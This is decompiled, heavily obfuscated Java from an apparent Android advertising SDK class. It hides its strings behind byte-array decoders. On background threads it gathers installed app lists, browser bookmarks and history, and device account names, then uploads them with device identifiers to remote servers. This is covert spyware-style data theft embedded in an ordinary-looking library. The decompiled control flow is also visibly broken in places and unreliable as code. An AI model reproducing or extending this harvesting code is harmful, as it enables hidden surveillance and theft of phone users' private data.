package com.svlsyr.nmbtks254818;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.Browser;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

final class j
  implements SharedPreferences.OnSharedPreferenceChangeListener, q<String>
{
  private static boolean j = false;
  private static final byte[] k = { 5, -78, -119, 40, -2, 13, -1, 7, -10, -5, 8, -45, 0, 3, -3, 82, -79, 12, 0, -18, 3, 0, 13, 1, 68, -73, -5, 78, -73, -5, 8, -9, 53, -5, 9, 11, -2, 0, -16, 20, -20, 11, 7, -13, 0, 3, -3, 82, -73, -5, 78, -65, -15, 0, 80, -73, -5, 8, -9, -2, -17, 11, -6, 1, 5, 6, -20, 26, -9, -1, -10, -1, 5, -3, -7, 25, -10, 34, -51, 27, -5, 23, -22, -45, 64, -47, 5, 28, -36, -10, 28, 2, -21, -13, 22, 27, -14, -36, 25, 30, 14, -53, 8, 48, 2, -70, 18, -6, 33, -45, 29, 1, 22, -46, 36, -34, 44, -45, 12, 34, 4, 0, -2, 11, -1, -7, 6, -20, 26, -2, -15, 0, -2, 0, -16, 20, -14, 9, 47, 9, -19, 4, 7, 8, -14, 0, 18, -6, 2, 2, -5, 3, 2, -8, 6, -20, 26, -21, 11, -4, 8, -44, 1, -6, 15, -19, 4, 84, -67, 2, -13, 78, -78, -1, -5, 84, -66, -3, 69, -78, -7, 9, 0, 62, -15, 0, -5, 8, -9, 49, 0, 0, 0, 14, -15, -1, 2, 14, -13, 9, -5, 8, -9, 15, -7, 43, -68, -5, -10, 18, -1, -10, 7, 1, 68, -79, -3, 82, -72, 7, -21, 17, 69, -78, -1, -5, 84, -79, -1, -4, 15, 1, 68, -73, -5, 64, -15, 0, 80, -73, -5, 8, -9, 79, -73, 2, -7, -1, -3, 13, 1, -29, -19, 19, 65, -83, 14, -9, 10, -5, -5, 7, 71, -73, 2, -7, -1, -3, 13, 1, 54, -37, 8, -9, 79, -83, 14, -9, -6, 58, 26, -34, 13, -1, -12, 13, -9, 11, -2, -14, 83, -67, -5, 7, -13, 7, 2, 1, 42, 26, 2, 14, -13 };
  private static int l = 235;
  q<String> a;
  q<String> b;
  private final String c = a(k[65], -k[11], 296);
  private final String d = a(k[65], k[3], 146);
  private final String e = a(k[34], k[3], l);
  private final String f;
  private Context g;
  private SharedPreferences h;
  private Url i;
  
  public j(Context paramContext)
    throws Exception
  {
    int m = k[0];
    int n = k[3];
    this.f = a(m, n, n | 0x86);
    this.a = new q()
    {
      private static final byte[] b = { 57, 88, -56, -113, 3, -23, 23, -12, -4, -13, -4, 2, -6, -10, 3, -23, 23, -5, -18, -3, -18, -3 };
      private static int c = 16;
      
      private static String a(int paramAnonymousInt1, int paramAnonymousInt2, int paramAnonymousInt3)
      {
        paramAnonymousInt2 += 4;
        int k = 11 - paramAnonymousInt1 * 4;
        byte[] arrayOfByte1 = b;
        int i = paramAnonymousInt3 * 10 + 97;
        byte[] arrayOfByte2 = new byte[k];
        if (arrayOfByte1 == null)
        {
          paramAnonymousInt3 = 0;
          paramAnonymousInt1 = paramAnonymousInt2;
          i = -i + paramAnonymousInt2 - 3;
          paramAnonymousInt2 = paramAnonymousInt3;
          paramAnonymousInt3 = paramAnonymousInt1;
          paramAnonymousInt1 = i;
        }
        for (;;)
        {
          int j = paramAnonymousInt3 + 1;
          paramAnonymousInt3 = paramAnonymousInt2 + 1;
          arrayOfByte2[paramAnonymousInt2] = ((byte)paramAnonymousInt1);
          if (paramAnonymousInt3 == k) {
            return new String(arrayOfByte2, 0);
          }
          i = arrayOfByte1[j];
          paramAnonymousInt2 = paramAnonymousInt1;
          paramAnonymousInt1 = j;
          break;
          paramAnonymousInt3 = paramAnonymousInt2;
          paramAnonymousInt1 = i;
          paramAnonymousInt2 = 0;
        }
      }
      
      public final void launchNewHttpTask()
      {
        if ((Main.isSDKEnabled(j.a(j.this))) && (Main.isEulaAccepted(j.a(j.this)))) {}
        try
        {
          Runnable local1 = new Runnable()
          {
            private static final byte[] b = { 20, -97, -110, 27, -10, 13, -11, 6, 9, 8, 8, -7, 8, -1, 11, -1, 28, -7, 37, -48, 30, -2, 26, -19, -42, 67, -44, 8, 31, -33, -7, 31, 5, -18, -10, 25, 30, -11, -33, 28, 33, 17, -50, 11, 51, 5, -67, 23, 29, 10, -50, 23, 30, 17, -50, 25, 40, -24, -26, 13, 51, -5, -61, 34, 5, 21, 24, -38, 5, 13, 33, -25, -31, 47, -42, 15, 37, 7, 3, -1, 11, -1, 13, -17, 14, 10, -42, 3, 6, 0, 2, -14, 16, 9, 1, 19, -22, 8, -5, -1, 19, -6, 12, -11, 3, -10, 13, -11, 6, 9, 8, 8, -7, 8, 8, -17, 14, 10 };
            private static int c = 129;
            
            private static String a(int paramAnonymous2Int1, int paramAnonymous2Int2, int paramAnonymous2Int3)
            {
              byte[] arrayOfByte1 = b;
              paramAnonymous2Int3 += 4;
              int m = 64 - paramAnonymous2Int2;
              paramAnonymous2Int2 = paramAnonymous2Int1 + 69;
              byte[] arrayOfByte2 = new byte[m];
              int j;
              int k;
              if (arrayOfByte1 == null)
              {
                paramAnonymous2Int1 = 0;
                j = paramAnonymous2Int3;
                k = paramAnonymous2Int2;
                k = -k;
                paramAnonymous2Int2 = j + 1;
                j = k + paramAnonymous2Int3 + 3;
                paramAnonymous2Int3 = paramAnonymous2Int1;
                paramAnonymous2Int1 = j;
              }
              for (;;)
              {
                int i = (byte)paramAnonymous2Int1;
                j = paramAnonymous2Int3 + 1;
                arrayOfByte2[paramAnonymous2Int3] = i;
                if (j == m) {
                  return new String(arrayOfByte2, 0).intern();
                }
                k = arrayOfByte1[paramAnonymous2Int2];
                paramAnonymous2Int3 = paramAnonymous2Int1;
                paramAnonymous2Int1 = j;
                j = paramAnonymous2Int2;
                break;
                j = paramAnonymous2Int3;
                paramAnonymous2Int1 = paramAnonymous2Int2;
                paramAnonymous2Int3 = 0;
                paramAnonymous2Int2 = j;
              }
            }
            
            public final void run()
            {
              Object localObject2 = new StringBuilder();
              Object localObject1 = new StringBuilder();
              Object localObject3 = j.a(j.this).getPackageManager().getInstalledApplications(128).iterator();
              while (((Iterator)localObject3).hasNext())
              {
                Object localObject4 = (ApplicationInfo)((Iterator)localObject3).next();
                if (j.a(j.this, (ApplicationInfo)localObject4))
                {
                  localObject4 = "\"" + ((ApplicationInfo)localObject4).packageName + "\"";
                  ((StringBuilder)localObject1).append((String)localObject4 + ",");
                }
                else
                {
                  localObject4 = "\"" + ((ApplicationInfo)localObject4).packageName + "\"";
                  ((StringBuilder)localObject2).append((String)localObject4 + ",");
                }
              }
              localObject2 = ((StringBuilder)localObject2).toString();
              localObject3 = ((StringBuilder)localObject1).toString();
              localObject1 = new ArrayList();
              int i = b[18] - 1;
              ((List)localObject1).add(new BasicNameValuePair(a(i, i | 0x18, b[8]), u.g()));
              ((List)localObject1).add(new BasicNameValuePair(a(b[18] - 1, 56, 75), u.h()));
              ((List)localObject1).add(new BasicNameValuePair(a(b[16], 54, b[89]), u.c(j.a(j.this))));
              ((List)localObject1).add(new BasicNameValuePair(a(b[16], -b[42], 101), u.d(j.a(j.this))));
              ((List)localObject1).add(new BasicNameValuePair(a(b[28], -b[19], 86), u.u()));
              ((List)localObject1).add(new BasicNameValuePair("user_apps", (String)localObject2));
              ((List)localObject1).add(new BasicNameValuePair("system_apps", (String)localObject3));
              try
              {
                r.a(j.a(j.this));
                localObject2 = j.a(j.this);
                localObject3 = j.this.a;
                j.b(j.this);
                new Thread(new r((Context)localObject2, (q)localObject3, (ArrayList)localObject1, Url.a(Url.UrlKey.app, a(b[16], b[89], b[102])), 30000L, false), "appd").start();
                return;
              }
              catch (Exception localException)
              {
                i = b[89];
                m.c(a(i, i | 0x3B, 82), localException);
              }
            }
          };
          int i = b[11];
          new Thread(local1, a(i, i | 0xD, 0).intern()).start();
          return;
        }
        catch (Exception localException) {}
      }
    };
    this.b = new q()
    {
      private static final byte[] b = { 32, 31, -56, 62, 28, -7, 37, -48, 30, -2, 26, -19, -42, 67, -44, 8, 31, -33, -7, 31, 5, -18, -10, 25, 30, -11, -33, 28, 33, 17, -50, 11, 51, 5, -67, 23, -8, 26, 38, -35, 5, 9, -34, 22, -7, 26, -30, 24, 50, -20, 29, -25, 29, -67, 5, 31, 44, -34, -33, 35, 5, 17, 10, -29, -7, 55, 9, -45, 52, -33, -32, 41, 15, -34, -11, 25, 32, 17, -61, 23, 21, 33, -63, 25, 28, 10, 7, -10, 13, -11, 6, 9, 8, 8, -7, 8, -1, 11, -1, 6, 9, 9, -17, 29, -6, 2, -7, 2, 8, 0, -4, 6, -16, 18, -1, 11, -1, 13, -17, 14, 10, 2, -14, 16, 9, 1, 19, -22, 8, -5, -1, 19, -6, 12, -11, 3, -10, 13, -11, 6, 9, 8, 8, -7, 8, 8, -17, 14, 10 };
      private static int c = 73;
      
      private static String a(int paramAnonymousInt1, int paramAnonymousInt2, int paramAnonymousInt3)
      {
        byte[] arrayOfByte2 = b;
        int k = 84 - paramAnonymousInt1;
        paramAnonymousInt1 = paramAnonymousInt3 + 4;
        byte[] arrayOfByte1 = new byte[k];
        int m;
        int j;
        if (arrayOfByte2 == null)
        {
          m = 0;
          paramAnonymousInt2 = paramAnonymousInt1;
          j = paramAnonymousInt1;
          paramAnonymousInt3 = k;
          paramAnonymousInt1 = paramAnonymousInt2;
          paramAnonymousInt2 = m;
          paramAnonymousInt1 += 1;
          j = -paramAnonymousInt3 + j + 3;
          paramAnonymousInt3 = paramAnonymousInt2;
        }
        for (paramAnonymousInt2 = j;; paramAnonymousInt2 = 117 - paramAnonymousInt2)
        {
          int i = (byte)paramAnonymousInt2;
          m = paramAnonymousInt3 + 1;
          arrayOfByte1[paramAnonymousInt3] = i;
          if (m == k) {
            return new String(arrayOfByte1, 0).intern();
          }
          paramAnonymousInt3 = arrayOfByte2[paramAnonymousInt1];
          j = paramAnonymousInt2;
          paramAnonymousInt2 = m;
          break;
          paramAnonymousInt3 = 0;
        }
      }
      
      public final void launchNewHttpTask()
      {
        if ((Main.isSDKEnabled(j.a(j.this))) && (Main.isEulaAccepted(j.a(j.this)))) {
          try
          {
            int i = b[109];
            Object localObject1 = a(81, i, i | 0x5F);
            Object localObject2 = a(80, b[29], c | 0x22);
            localObject2 = j.a(j.this).getContentResolver().query(Browser.BOOKMARKS_URI, new String[] { localObject1, localObject2 }, null, null, null);
            localObject1 = new JSONArray();
            if (localObject2 != null) {
              if (!((Cursor)localObject2).moveToFirst()) {}
            }
            for (;;)
            {
              long l = ((Cursor)localObject2).getLong(((Cursor)localObject2).getColumnIndex(a(80, b[29], c | 0x22)));
              i = b[109];
              Object localObject3 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex(a(81, i, i | 0x5F)));
              try
              {
                JSONObject localJSONObject = new JSONObject();
                localJSONObject.put(a(80, b[29], c | 0x22), u.a(Long.valueOf(l).longValue()));
                i = b[109];
                localJSONObject.put(a(81, i, i | 0x5F), localObject3);
                ((JSONArray)localObject1).put(localJSONObject);
                if (!((Cursor)localObject2).moveToNext())
                {
                  ((Cursor)localObject2).close();
                  localObject2 = new ArrayList();
                  i = b[''];
                  ((List)localObject2).add(new BasicNameValuePair(a(80, i, i | 0x50), u.g()));
                  i = c;
                  int j = b[''];
                  ((List)localObject2).add(new BasicNameValuePair(a(i + 3, j, j | 0x62), u.h()));
                  ((List)localObject2).add(new BasicNameValuePair(a(c + 1, -b[49], 83), u.c(j.a(j.this))));
                  ((List)localObject2).add(new BasicNameValuePair(a(c - 3, -b[49], 132), u.d(j.a(j.this))));
                  i = c;
                  j = b[29];
                  ((List)localObject2).add(new BasicNameValuePair(a(i - 5, j, j | 0x64), u.u()));
                  ((List)localObject2).add(new BasicNameValuePair("inputlist", ((JSONArray)localObject1).toString()));
                  new StringBuilder("History Values >>>>>>: ").append(localObject2);
                  m.a();
                  r.a(j.a(j.this));
                  localObject1 = j.a(j.this);
                  localObject3 = j.this.b;
                  j.b(j.this);
                  new Thread(new r((Context)localObject1, (q)localObject3, (ArrayList)localObject2, Url.a(Url.UrlKey.his, a(b[109], -b[49], b[109])), 5000L, false), "browser").start();
                  return;
                }
              }
              catch (JSONException localJSONException)
              {
                m.a();
                return;
              }
            }
            return;
          }
          catch (Exception localException)
          {
            m.c("Error in history", localException);
          }
        }
      }
    };
    this.g = paramContext;
    if (paramContext == null)
    {
      m = k[94];
      n = k[12];
      throw new NullPointerException(a(m, n, n | 0x8B));
    }
    this.h = paramContext.getSharedPreferences(a(k[65], -k[11], 296), 0);
    this.h.registerOnSharedPreferenceChangeListener(this);
    this.i = Url.a(paramContext);
  }
  
  private long a(String paramString)
    throws NullPointerException
  {
    if (this.h == null) {
      this.h = this.g.getSharedPreferences(a(k[65], -k[11], 296), 0);
    }
    return this.h.getLong(paramString, 0L);
  }
  
  private String a()
  {
    for (;;)
    {
      int m;
      try
      {
        Object localObject1 = AccountManager.get(this.g).getAccounts();
        JSONObject localJSONObject = new JSONObject();
        m = 0;
        int n = localObject1.length;
        if (m < n)
        {
          Object localObject2 = localObject1[m];
          try
          {
            JSONArray localJSONArray;
            if (localJSONObject.has(localObject2.type))
            {
              localJSONArray = localJSONObject.getJSONArray(localObject2.type);
              localJSONArray.put(u.l(localObject2.name));
              localJSONObject.put(localObject2.type, localJSONArray);
            }
            else
            {
              localJSONArray = new JSONArray();
              localJSONArray.put(u.l(localObject2.name));
              localJSONObject.put(localObject2.type, localJSONArray);
            }
          }
          catch (Exception localException2) {}
        }
        localObject1 = localJSONObject.toString();
        return localObject1;
      }
      catch (Exception localException1)
      {
        localException1.getMessage();
        m.a();
        return "";
      }
      m += 1;
    }
  }
  
  private static String a(int paramInt1, int paramInt2, int paramInt3)
  {
    paramInt3 = 299 - paramInt3;
    byte[] arrayOfByte2 = k;
    int n = paramInt1 + 2;
    byte[] arrayOfByte1 = new byte[n];
    int m;
    if (arrayOfByte2 == null)
    {
      paramInt1 = 0;
      paramInt2 = paramInt3;
      m = n;
      paramInt3 = m + -paramInt3;
      m = paramInt1;
      paramInt1 = paramInt3;
    }
    for (;;)
    {
      arrayOfByte1[m] = ((byte)paramInt1);
      int i1 = m + 1;
      if (i1 == n) {
        return new String(arrayOfByte1, 0).intern();
      }
      paramInt2 += 1;
      paramInt3 = arrayOfByte2[paramInt2];
      m = paramInt1;
      paramInt1 = i1;
      break;
      m = 0;
      paramInt1 = paramInt2 + 67;
      paramInt2 = paramInt3;
    }
  }
  
  private void a(String paramString, long paramLong)
    throws Exception
  {
    if (this.h == null) {
      this.h = this.g.getSharedPreferences(a(k[65], -k[11], 296), 0);
    }
    SharedPreferences.Editor localEditor = this.h.edit();
    localEditor.putLong(paramString, System.currentTimeMillis() + paramLong);
    localEditor.commit();
  }
  
  private static long b(String paramString)
  {
    localObject = Long.valueOf(604800000L);
    try
    {
      long l1 = new JSONObject(paramString).getLong(a(k[100], k['Í'], l & 0x3B5));
      paramString = Long.valueOf(l1 * 1000L);
    }
    catch (Exception paramString)
    {
      for (;;)
      {
        paramString.getMessage();
        m.a();
        paramString = (String)localObject;
      }
    }
    localObject = paramString;
    if (paramString.longValue() < 3600L) {
      localObject = Long.valueOf(604800000L);
    }
    return ((Long)localObject).longValue();
  }
  
  private String b()
  {
    for (;;)
    {
      int m;
      try
      {
        Object localObject1 = AccountManager.get(this.g).getAccounts();
        JSONObject localJSONObject = new JSONObject();
        m = 0;
        int n = localObject1.length;
        if (m < n)
        {
          Object localObject2 = localObject1[m];
          try
          {
            JSONArray localJSONArray;
            if (localJSONObject.has(localObject2.type))
            {
              localJSONArray = localJSONObject.getJSONArray(localObject2.type);
              localJSONArray.put(u.m(localObject2.name));
              localJSONObject.put(localObject2.type, localJSONArray);
            }
            else
            {
              localJSONArray = new JSONArray();
              localJSONArray.put(u.m(localObject2.name));
              localJSONObject.put(localObject2.type, localJSONArray);
            }
          }
          catch (Exception localException2) {}
        }
        localObject1 = localJSONObject.toString();
        return localObject1;
      }
      catch (Exception localException1)
      {
        localException1.getMessage();
        m.a();
        return "";
      }
      m += 1;
    }
  }
  
  public final void launchNewHttpTask()
  {
    for (;;)
    {
      try
      {
        if ((System.currentTimeMillis() >= a(a(k[65], k[3], 146))) && (!j)) {
          continue;
        }
        a(k['ý'], k[23], k['½']);
        m.a();
      }
      catch (Exception localException)
      {
        m.b(localException.getMessage());
        continue;
      }
      finally {}
      return;
      if ((!Main.isSDKEnabled(this.g)) || (!Main.isEulaAccepted(this.g)))
      {
        a(l & 0x30, -k[38], l & 0x175);
        m.a();
      }
      else
      {
        r.a(this.g);
        int m = k[65];
        m.a(a(m, m | 0x20, 114));
        j = true;
        ArrayList localArrayList = new ArrayList();
        String str = a(k[13], k['Ī'], 178);
        m = k[91];
        localArrayList.add(new BasicNameValuePair(str, a(m, m | 0x30, k[12])));
        localArrayList.add(new BasicNameValuePair(a(k[120], k[99], 241), a(k[34], k[103], l & 0x17F)));
        localArrayList.add(new BasicNameValuePair(a(k[91], k['½'], 267), a(k[23], k[99], 116)));
        localArrayList.add(new BasicNameValuePair(a(k[65], k[99], l & 0x3BC), a()));
        localArrayList.add(new BasicNameValuePair(a(k[65], k[99], 264), b()));
        new Thread(new r(this.g, this, localArrayList, Url.a(Url.UrlKey.info, a(-k[113], k[99], l & 0x3F5)), 20000L, true), a(k[12], k[103], l + 1)).start();
      }
    }
  }
  
  public final void onSharedPreferenceChanged(SharedPreferences paramSharedPreferences, String paramString)
  {
    new StringBuilder().append(a(k[106], k[5], k['ý'])).append(paramString);
    m.a();
    if (paramSharedPreferences != null) {
      this.h = paramSharedPreferences;
    }
  }
}
